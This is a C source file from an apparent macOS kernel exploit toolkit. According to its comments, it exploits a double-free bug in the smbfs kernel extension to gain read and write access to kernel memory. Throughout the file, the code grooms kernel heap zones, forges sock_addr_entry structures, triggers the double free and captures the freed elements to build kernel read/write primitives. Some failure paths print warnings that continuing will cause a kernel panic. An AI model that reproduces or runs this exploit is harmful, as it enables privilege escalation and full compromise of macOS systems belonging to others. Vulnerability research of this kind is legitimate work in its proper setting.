//
//  smb_dev_rw.c
//  xe_kmem
//
//  Created by admin on 2/22/22.
//

#include <assert.h>
#include <stdatomic.h>
#include <arpa/inet.h>

#include <dispatch/dispatch.h>

#include <sys/stat.h>

#include <xe/memory/kmem.h>
#include <xe/slider/kext.h>
#include <xe/util/log.h>
#include <xe/util/assert.h>
#include <xe/xnu/proc.h>

#include <smbfs/kext.h>

#include "memory/allocator_rw.h"
#include "memory/allocator_nrnw.h"
#include "memory/zkext_alloc_small.h"
#include "memory/zkext_free.h"
#include "smb/client.h"
#include "smb/params.h"

#include "smb_dev_rw.h"

static_assert(sizeof(struct smb_dev) == 48, "");

#define NUM_KEXT_32_FRAGMENTED_PAGES    1024
#define MAX_SOCK_ADDR_ENTRY_ALLOC_TRIES 100
#define MAX_SOCK_ADDR_ALLOC_TRIES       100

#define NUM_DBF_CAPTURE_ALLOCS       256
#define NUM_SMB_DEV_CAPTURE_ALLOCS   512
#define NUM_SMB_DEV_RECAPTURE_ALLOCS 512


static const struct sockaddr_in6 SMB_DEV_CAPTURE_DATA = {
    .sin6_len = sizeof(struct sockaddr_in6),
    .sin6_family = AF_INET6,
    .sin6_port = 1234
};


typedef struct smb_dev_rw_session_shared {
    _Atomic int ref_cnt;
    kmem_zkext_free_session_t dbf_session;
} *smb_dev_rw_session_shared_t;


smb_dev_rw_session_shared_t smb_dev_rw_shared_session_create(kmem_zkext_free_session_t dbf_session) {
    struct smb_dev_rw_session_shared* session = malloc(sizeof(struct smb_dev_rw_session_shared));
    session->ref_cnt = 1;
    session->dbf_session = dbf_session;
    return session;
}

smb_dev_rw_session_shared_t smb_dev_rw_shared_session_ref(smb_dev_rw_session_shared_t session) {
    int old = atomic_fetch_add(&session->ref_cnt, 1);
    xe_assert(old >= 0);
    return session;
}


void smb_dev_rw_shared_session_unref(smb_dev_rw_session_shared_t* sessionp) {
    smb_dev_rw_session_shared_t session = *sessionp;
    int old = atomic_fetch_sub(&session->ref_cnt, 1);
    if (old == 1) {
        kmem_zkext_free_session_destroy(&session->dbf_session);
        free(session);
    }
    *sessionp = NULL;
}


struct smb_dev_rw {
    int fd_dev;
    int fd_rw;
    _Bool rw_data1;
    _Bool active;
    
    struct sockaddr_in smb_addr;
    struct smb_dev_rw_session_shared* session;
    
    struct smb_dev backup;
};


// Build a fake socket address which can be used to construct a fake sock_addr_entry
// NOTE: The layout of `struct sock_addr_entry` is as follows
//
// struct sock_addr_entry {
//   struct sockaddr* addr;
//   TAILQ_ENTRY(sock_addr_entry) next;
// };
//
// The fake sock_addr_entry is allocated using `kmem_zkext_alloc_small` which allocates provided
// data as a socket address. This means that the first byte in allocated data will always be the
// size of allocation. Since we want to acheive read write on smb_dev which is allocated on kext.48
// zone, we want the fake sock_addr_entry and fake socket_address to be allocated on kext.48 zone.
// 
//
struct kmem_zkext_alloc_small_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
    for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
        struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 48, AF_INET, NULL, 0);
        uintptr_t addr = entry.address;
        uint8_t sa_len = (uint8_t)addr;
        uint8_t sa_family = (uint8_t)(addr >> 8);
        if (sa_len == 48 && sa_family != AF_INET && sa_family != AF_INET6) {
            return entry;
        } else {
            kmem_allocator_nrnw_allocate(nrnw_allocator, 48, random() % 128);
            kmem_allocator_prpw_destroy(&entry.element_allocator);
        }
    }
    xe_log_error("failed to allocate kext.48 element having address ending with 48");
    abort();
}


struct kmem_zkext_alloc_small_entry smb_dev_rw_alloc_sock_addr_entry(const struct sockaddr_in* smb_addr, uintptr_t sock_addr, uintptr_t tqe_prev) {
    uint8_t sa_len = (uint8_t)sock_addr;
    xe_assert(sa_len == 48);
    uint8_t sa_family = (uint8_t)(sock_addr >> 8);
    xe_assert(sa_family != AF_INET && sa_family != AF_INET6);
    
    struct sock_addr_entry entry;
    entry.addr = (struct sockaddr*)sock_addr;
    entry.next.tqe_next = 0;
    entry.next.tqe_prev = (struct sock_addr_entry**)tqe_prev;
    
    for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
        struct kmem_zkext_alloc_small_entry alloc = kmem_zkext_alloc_small(smb_addr, sa_len, sa_family, (char*)&entry + 2, sizeof(entry) - 2);
        uintptr_t allocated_address = alloc.address;
        if (allocated_address % 32 == 0) {
            kmem_allocator_prpw_destroy(&alloc.element_allocator);
        } else {
            return alloc;
        }
    }
    xe_log_error("failed to allocate sock_addr");
    abort();
}


void smb_dev_rw_fragment_kext_32(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
    kmem_allocator_nrnw_t gap_allocator = kmem_allocator_nrnw_create(smb_addr);
    for (int i=0; i<NUM_KEXT_32_FRAGMENTED_PAGES; i++) {
        kmem_allocator_nrnw_allocate(nrnw_allocator, 32, 2);
        kmem_allocator_nrnw_allocate(gap_allocator, 32, (XE_PAGE_SIZE / 32) - 2);
    }
    kmem_allocator_nrnw_destroy(&gap_allocator);
}


struct smb_dev_rw* smb_dev_rw_create_from_capture(const struct sockaddr_in* smb_addr, int capture_smb_devs[NUM_SMB_DEV_CAPTURE_ALLOCS], kmem_allocator_rw_t capture_allocator, smb_dev_rw_session_shared_t session) {
    
    int64_t capture_idx = -1;
    int error = kmem_allocator_rw_filter(capture_allocator, 0, kmem_allocator_rw_get_backend_count(capture_allocator), 48, 0, ^_Bool(void* ctx, char* data1, char* data2, size_t idx) {
        if (memcmp(data1, &SMB_DEV_CAPTURE_DATA, sizeof(SMB_DEV_CAPTURE_DATA)) != 0) {
            xe_log_debug_hexdump(data1, 48, "captured rw_allocator with data: ");
            return TRUE;
        }
        return FALSE;
    }, NULL, &capture_idx);
    xe_assert_err(error);
    
    if (capture_idx < 0) {
        return NULL;
    }
    
    struct smb_dev captured_smb_dev;
    error = kmem_allocator_rw_read(capture_allocator, (int)capture_idx, (char*)&captured_smb_dev, sizeof(captured_smb_dev), NULL, UINT32_MAX);
    xe_assert_err(error);
    
    struct smb_dev_rw* dev_rw = malloc(sizeof(struct smb_dev_rw));
    bzero(dev_rw, sizeof(struct smb_dev_rw));
    dev_rw->smb_addr = *smb_addr;
    dev_rw->fd_rw = kmem_allocator_rw_disown_backend(capture_allocator, (int)capture_idx);
    dev_rw->fd_dev = -1;
    dev_rw->rw_data1 = TRUE;
    dev_rw->session = smb_dev_rw_shared_session_ref(session);
    dev_rw->active = FALSE;
    
    if (captured_smb_dev.sd_rwlock.opaque[0] != 0x420000 || captured_smb_dev.sd_rwlock.opaque[1] != 0) {
        return dev_rw;
    }
    
    if (!xe_vm_kernel_address_valid((uintptr_t)captured_smb_dev.sd_devfs)) {
        return dev_rw;
    }
    
    if (captured_smb_dev.sd_session != NULL || captured_smb_dev.sd_share != NULL) {
        return dev_rw;
    }
    
    if (captured_smb_dev.sd_flags != NSMBFL_OPEN) {
        return dev_rw;
    }
    
    for (int i=0; i<NUM_SMB_DEV_CAPTURE_ALLOCS; i++) {
        if (capture_smb_devs[i] < 0) {
            continue;
        }
        
        int error = smb_client_ioc_cancel_session(capture_smb_devs[i]);
        xe_assert_err(error);
        
        struct smb_dev smb_dev;
        error = smb_client_ioc_auth_info(dev_rw->fd_rw, (char*)&smb_dev, 48, NULL, 0, NULL);
        xe_assert_err(error);
        
        if (smb_dev.sd_flags & NSMBFL_CANCEL) {
            dev_rw->fd_dev = capture_smb_devs[i];
            dev_rw->backup = smb_dev;
            capture_smb_devs[i] = -1;
            dev_rw->active = TRUE;
            break;
        }
    }
    
    if (dev_rw->active) {
        xe_assert(dev_rw->fd_dev >= 0);
        xe_assert(dev_rw->fd_rw >= 0);
    }
    
    return dev_rw;
}


// Exploit double free vulnerability in `smb2_mc_parse_client_interface_array` to achieve
// read write access to smb dev (`struct smb_dev`) in kext.48 zone
void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t* dev1_p, smb_dev_rw_t* dev2_p) {
    kmem_allocator_nrnw_t nrnw_allocator = kmem_allocator_nrnw_create(smb_addr);
    
    /// Make sure OOB reads in kext.32 zone will not cause kernel data abort
    smb_dev_rw_fragment_kext_32(smb_addr, nrnw_allocator);
    
    struct kmem_zkext_alloc_small_entry saddr_alloc = smb_dev_rw_alloc_sock_addr(smb_addr, nrnw_allocator);
    uintptr_t saddr_addr = saddr_alloc.address;
    xe_log_debug("allocated socket_address at %p", (void*)saddr_addr);
    
    kmem_zkext_free_session_t dbf_session = kmem_zkext_free_session_create(smb_addr);
    struct complete_nic_info_entry dbf_nic = kmem_zkext_free_session_prepare(dbf_session);
    uintptr_t dbf_nic_addr = ((uintptr_t)dbf_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections));
    xe_log_debug("leaked nic at %p", (void*)dbf_nic_addr);
    
    kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 32);
    
    struct kmem_zkext_alloc_small_entry saddr_entry_alloc = smb_dev_rw_alloc_sock_addr_entry(smb_addr, saddr_addr, dbf_nic_addr + offsetof(struct complete_nic_info_entry, addr_list.tqh_first));
    uintptr_t saddr_entry_addr = saddr_entry_alloc.address;
    xe_log_debug("allocated sock_addr_entry at %p", (void*)saddr_entry_addr);
    
    kmem_allocator_rw_t capture_allocator = kmem_allocator_rw_create(smb_addr, NUM_DBF_CAPTURE_ALLOCS);
    
    dbf_nic.next.next = NULL;
    dbf_nic.addr_list.tqh_first = (struct sock_addr_entry*)saddr_entry_addr;
    dbf_nic.addr_list.tqh_last = 0;
    
    char* capture_data = alloca(48);
    bzero(capture_data, 48);
    memcpy(capture_data, &SMB_DEV_CAPTURE_DATA, sizeof(SMB_DEV_CAPTURE_DATA));
    
    xe_log_debug("begin double free");
    kmem_zkext_free_session_execute(dbf_session, &dbf_nic);
    int error = kmem_allocator_rw_allocate(capture_allocator, NUM_DBF_CAPTURE_ALLOCS, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t idx) {
        *data1 = capture_data;
        *data1_size = 48;
        *data2 = NULL;
        *data2_size = 0;
    }, NULL);
    xe_assert_err(error);
    xe_log_debug("double free complete");
    
    kmem_allocator_prpw_data_filter filter = ^_Bool(void* ctx, sa_family_t address_family, size_t idx) {
        return address_family == AF_INET6;
    };
    
    int64_t saddr_found_index = -1;
    error = kmem_allocator_prpw_filter(saddr_alloc.element_allocator, 0, kmem_allocator_prpw_get_capacity(saddr_alloc.element_allocator), filter, NULL, &saddr_found_index);
    xe_assert_err(error);
    
    int64_t saddr_entry_found_index = -1;
    error = kmem_allocator_prpw_filter(saddr_entry_alloc.element_allocator, 0, kmem_allocator_prpw_get_capacity(saddr_entry_alloc.element_allocator), filter, NULL, &saddr_entry_found_index);
    xe_assert_err(error);
    
    if (saddr_entry_found_index < 0 && saddr_found_index < 0) {
        xe_log_error("failed to capture both kext.48 allocs using rw allocator");
        getpass("[INFO] press enter to continue. THIS WILL CAUSE KERNEL PANIC\n");
        abort();
    } else if (saddr_entry_found_index < 0) {
        xe_log_warn("failed to capture saddr_entry using rw allocator");
    } else if (saddr_found_index < 0) {
        xe_log_warn("failed to capture saddr using rw allocator");
    }
    
    smb_dev_rw_t dev1 = NULL;
    smb_dev_rw_t dev2 = NULL;
    smb_dev_rw_session_shared_t session = smb_dev_rw_shared_session_create(dbf_session);
    
    int* capture_smb_devs = alloca(sizeof(int) * NUM_SMB_DEV_CAPTURE_ALLOCS);
    memset(capture_smb_devs, -1, sizeof(int) * NUM_SMB_DEV_CAPTURE_ALLOCS);
    
    dispatch_apply(NUM_SMB_DEV_CAPTURE_ALLOCS, DISPATCH_APPLY_AUTO, ^(size_t idx) {
        if (idx == 32) {
            if (saddr_entry_found_index >= 0) {
                int error = kmem_allocator_prpw_release_containing_backend(saddr_entry_alloc.element_allocator, saddr_entry_found_index);
                xe_assert_err(error);
            }
            if (saddr_found_index >= 0) {
                int error = kmem_allocator_prpw_release_containing_backend(saddr_alloc.element_allocator, saddr_found_index);
                xe_assert_err(error);
            }
        }
        capture_smb_devs[idx] = smb_client_open_dev();
        xe_assert(capture_smb_devs[idx] >= 0);
    });
    
    if (saddr_entry_found_index >= 0) {
        xe_log_debug("capturing sock_addr_entry with smb_dev");
        dev1 = smb_dev_rw_create_from_capture(smb_addr, capture_smb_devs, capture_allocator, session);
    }
    
    if (saddr_found_index >= 0) {
        xe_log_debug("capturing sock_addr with smb_dev");
         dev2 = smb_dev_rw_create_from_capture(smb_addr, capture_smb_devs, capture_allocator, session);
    }
    
    dispatch_apply(NUM_SMB_DEV_CAPTURE_ALLOCS, DISPATCH_APPLY_AUTO, ^(size_t idx) {
        if (capture_smb_devs[idx] >= 0) {
            close(capture_smb_devs[idx]);
        }
    });
    
    _Bool dev1_ok = dev1 && dev1->active;
    _Bool dev2_ok = dev2 && dev2->active;
    
    if (!dev1_ok && !dev2_ok) {
        xe_log_error("failed to captue both kext.48 elements with smb_dev");
        getpass("press enter to continue. THIS WILL CAUSE KERNEL PANIC\n");
        abort();
    } else if (!dev1_ok) {
        xe_log_warn("failed to capture saddr_entry using smb_dev");
    } else if (!dev2_ok) {
        xe_log_warn("failed to capture saddr with smb_dev");
    }
    
    if (dev1 && dev2) {
        *dev1_p = dev1;
        *dev2_p = dev2;
    } else if (dev1) {
        *dev1_p = dev1;
        *dev2_p = NULL;
    } else if (dev2) {
        *dev1_p = dev2;
        *dev2_p = NULL;
    } else {
        // not reachable
        abort();
    }
    
    xe_log_debug("smb_dev_rw created with %d active backends", dev1_ok + dev2_ok);
    
    smb_dev_rw_shared_session_unref(&session);
    kmem_allocator_rw_destroy(&capture_allocator);
    kmem_allocator_prpw_destroy(&saddr_entry_alloc.element_allocator);
    kmem_allocator_prpw_destroy(&saddr_alloc.element_allocator);
    kmem_allocator_nrnw_destroy(&nrnw_allocator);
}

void smb_dev_rw_read_data(smb_dev_rw_t dev, struct smb_dev* out) {
    xe_assert(dev->active == TRUE);
    uint32_t cpn_len = dev->rw_data1 ? 48 : UINT32_MAX;
    uint32_t spn_len = dev->rw_data1 ? UINT32_MAX : 48;
    
    int error = smb_client_ioc_auth_info(dev->fd_rw, (char*)out, cpn_len, (char*)out, spn_len, NULL);
    xe_assert_err(error);
}

int smb_dev_rw_write_data(smb_dev_rw_t dev, struct smb_dev* data) {
    xe_assert(dev->active == TRUE);
    data->sd_flags &= ~NSMBFL_CANCEL;
    
    xe_log_debug_hexdump(data, sizeof(*data), "writing smb_dev at %d with:", dev->fd_dev);
    
    kmem_allocator_rw_t capture_allocator = kmem_allocator_rw_create(&dev->smb_addr, NUM_SMB_DEV_RECAPTURE_ALLOCS / 2);
    close(dev->fd_rw);
    
    int error = kmem_allocator_rw_allocate(capture_allocator, NUM_SMB_DEV_RECAPTURE_ALLOCS / 2, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t idx) {
        *data1 = (char*)data;
        *data1_size = 48;
        *data2 = (char*)data;
        *data2_size = 48;
    }, NULL);
    xe_assert_err(error);
    
    error = smb_client_ioc_cancel_session(dev->fd_dev);
    if (error == EBADF) {
        kmem_allocator_rw_destroy(&capture_allocator);
        return error;
    }
    xe_assert_err(error);
    
    int64_t found_idx;
    error = kmem_allocator_rw_filter(capture_allocator, 0, kmem_allocator_rw_get_backend_count(capture_allocator), 48, 48, ^_Bool(void* ctx, char* data1, char* data2, size_t idx) {
        struct smb_dev* dev1 = (struct smb_dev*)data1;
        struct smb_dev* dev2 = (struct smb_dev*)data2;
        if (dev1->sd_flags & NSMBFL_CANCEL) {
            dev->rw_data1 = TRUE;
            return TRUE;
        }
        if (dev2->sd_flags & NSMBFL_CANCEL) {
            dev->rw_data1 = FALSE;
            return TRUE;
        }
        return FALSE;
    }, NULL, &found_idx);
    
    if (found_idx < 0) {
        dev->active = FALSE;
        dev->fd_rw = -1;
        dev->fd_dev = -1;
        error = EIO;
        xe_log_debug("smb_dev_rw write failed");
    } else {
        dev->fd_rw = kmem_allocator_rw_disown_backend(capture_allocator, (int)found_idx);
        error = 0;
        xe_log_debug("smb_dev_rw write ok");
    }
    
    kmem_allocator_rw_destroy(&capture_allocator);
    return error;
}

int smb_dev_rw_read(smb_dev_rw_t dev, struct smb_dev* out) {
    if (!dev->active) {
        return EBADF;
    }
    smb_dev_rw_read_data(dev, out);
    return 0;
}

int smb_dev_rw_write(smb_dev_rw_t dev, struct smb_dev* data) {
    if (!dev->active) {
        return EBADF;
    }
    return smb_dev_rw_write_data(dev, data);
}

int smb_dev_rw_get_dev_fd(smb_dev_rw_t dev) {
    return dev->fd_dev;
}

_Bool smb_dev_rw_is_active(smb_dev_rw_t dev) {
    return dev->active;
}

uintptr_t smb_dev_rw_get_session(smb_dev_rw_t dev) {
    struct smb_dev smb_dev;
    int error = smb_dev_rw_read(dev, &smb_dev);
    xe_assert_err(error);
    return (uintptr_t)smb_dev.sd_session;
}


uintptr_t smb_dev_rw_fd_to_dev(xe_slider_kext_t slider, int fd) {
    struct stat dev_stat;
    int res = fstat(fd, &dev_stat);
    xe_assert_errno(res);
    dev_t dev = dev_stat.st_dev;
    
    uintptr_t smb_dtab = xe_slider_kext_slide(slider, XE_KEXT_SEGMENT_DATA, KEXT_SMBFS_VAR_SMB_DTAB_DATA_OFFSET);
    
    return xe_kmem_read_ptr(smb_dtab, minor(dev) * sizeof(uintptr_t));
}


void smb_dev_rw_destroy(smb_dev_rw_t* rw_p) {
    smb_dev_rw_t rw = *rw_p;
    
    xe_slider_kext_t slider = xe_slider_kext_create("com.apple.filesystems.smbfs", XE_KC_BOOT);
    
    if (rw->fd_dev >= 0) {
        struct smb_dev restore_dev;
        restore_dev.sd_rwlock.opaque[0] = 0x420000;
        restore_dev.sd_rwlock.opaque[1] = 0;
        restore_dev.sd_devfs = rw->backup.sd_devfs;
        restore_dev.sd_flags = NSMBFL_OPEN;
        restore_dev.sd_share = NULL;
        restore_dev.sd_session = NULL;
        
        uintptr_t smb_dev = smb_dev_rw_fd_to_dev(slider, rw->fd_dev);
        xe_kmem_write(smb_dev, 0, &restore_dev, sizeof(restore_dev));
        close(rw->fd_dev);
    }
    
    if (rw->fd_rw >= 0) {
        uintptr_t smb_dev = smb_dev_rw_fd_to_dev(slider, rw->fd_rw);
        uintptr_t smb_session = xe_kmem_read_ptr(smb_dev, offsetof(struct smb_dev, sd_session));
        uintptr_t iod = xe_kmem_read_ptr(smb_session, TYPE_SMB_SESSION_MEM_SESSION_IOD_OFFSET);
        // TODO: only one of them will cause double free
        xe_kmem_write_uint64(iod, offsetof(struct smbiod, iod_gss.gss_spn), 0);
        xe_kmem_write_uint32(iod, offsetof(struct smbiod, iod_gss.gss_spn_len), 0);
        xe_kmem_write_uint64(iod, offsetof(struct smbiod, iod_gss.gss_cpn), 0);
        xe_kmem_write_uint32(iod, offsetof(struct smbiod, iod_gss.gss_cpn_len), 0);
        close(rw->fd_dev);
    }
    
    smb_dev_rw_shared_session_unref(&rw->session);
    
    xe_slider_kext_destroy(&slider);
    free(rw);
    *rw_p = NULL;
}
